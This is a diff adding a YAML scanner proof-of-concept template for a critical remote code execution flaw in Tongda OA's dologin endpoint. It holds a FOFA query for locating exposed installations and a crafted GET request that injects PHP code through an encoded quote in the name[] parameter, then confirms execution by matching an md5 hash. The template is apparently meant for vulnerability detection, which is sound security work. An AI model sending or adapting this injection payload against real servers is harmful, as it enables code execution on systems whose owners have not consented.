@@ -1,0 +1,18 @@
+id: poc-yaml-tongda-oa-dologin-rce
+info:
+  name: 通达OA dologin 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: 通达OA
+  fofa: app="TDXK-通达OA"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6%27.print_r(md5({{.t1}})),//
+  expression: status_code == 200 && contains(body,"\"status\":\"1\"") && contains(body,t2)
+    && contains(content_type,"application/json") && !contains(body,"<")
+transport: http
